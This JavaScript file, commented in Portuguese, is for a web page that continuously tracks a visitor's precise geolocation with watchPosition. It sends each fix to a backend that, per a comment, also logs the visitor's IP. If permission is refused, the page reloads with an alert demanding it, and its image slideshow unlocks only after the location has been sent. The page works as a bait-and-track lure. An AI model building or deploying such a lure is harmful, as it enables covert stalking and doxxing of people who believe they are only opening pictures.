let watchId = null; // Variável global para controlar o monitoramento

async function success(pos) {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // Enviar ao backend sem o IP (será capturado no backend)
    fetch('/localizacoes', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            latitude: lat, 
            longitude: lon 
        })
    }).then(res => {
        if (res.ok) {
            console.log('Localização enviada com sucesso!');
            mostrarBotaoAbrirImagens(); // Mostra o botão depois da confirmação
        } else {
            res.json().then(data => {
                console.warn('Erro ao salvar localização:', data.message);
            });
        }
    }).catch(err => console.error('Erro ao enviar localização:', err));
}


function error(err) {
    console.warn(`Erro ao obter localização: ${err.message}`);
    alert('Por favor, permita o compartilhamento da sua localização para continuar.');
    location.reload(); // Recarrega para tentar novamente
}

// Solicitar localização continuamente enquanto o site estiver aberto
function iniciarMonitoramento() {
    if ('geolocation' in navigator) {
        watchId = navigator.geolocation.watchPosition(success, error, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    } else {
        console.error('Geolocalização não é suportada nesse navegador.');
    }
}

// Parar o monitoramento caso queira (não obrigatório aqui)
// function pararMonitoramento() {
//     if (watchId !== null) {
//         navigator.geolocation.clearWatch(watchId);
//     }
// }

// Iniciar monitoramento ao carregar a página
window.addEventListener('load', iniciarMonitoramento);


// Função para criar o botão "Abrir imagens"
function mostrarBotaoAbrirImagens() {
    const botao = document.createElement('button');
    botao.textContent = 'Abrir imagens';
    botao.className = 'btn-abrir-imagens';
    botao.onclick = iniciarSlideshow;
    document.body.appendChild(botao);
}

// Função que carrega o slideshow ao clicar no botão
function iniciarSlideshow() {
    const slideshow = document.createElement('div');
    slideshow.className = 'slideshow';

    const imagens = [
        'src/img/01.jpg',
        'src/img/02.png',
        'src/img/03.png',
        'src/img/04.jpg',
    ];

    imagens.forEach((src, index) => {
        const img = document.createElement('img');
        img.src = src;
        img.className = 'slide';
        if (index === 0) img.classList.add('active');
        slideshow.appendChild(img);
    });

    document.body.appendChild(slideshow);

    iniciarTrocaDeSlides();

    // Remove o botão depois de clicar
    const botao = document.querySelector('.btn-abrir-imagens');
    if (botao) {
        botao.remove();
    }
}

// Função para alternar os slides
function iniciarTrocaDeSlides() {
    const slides = document.querySelectorAll('.slide');
    let index = 0;

    setInterval(() => {
        slides[index].classList.remove('active');
        index = (index + 1) % slides.length;
        slides[index].classList.add('active');
    }, 3000); // Troca a cada 3 segundos
}
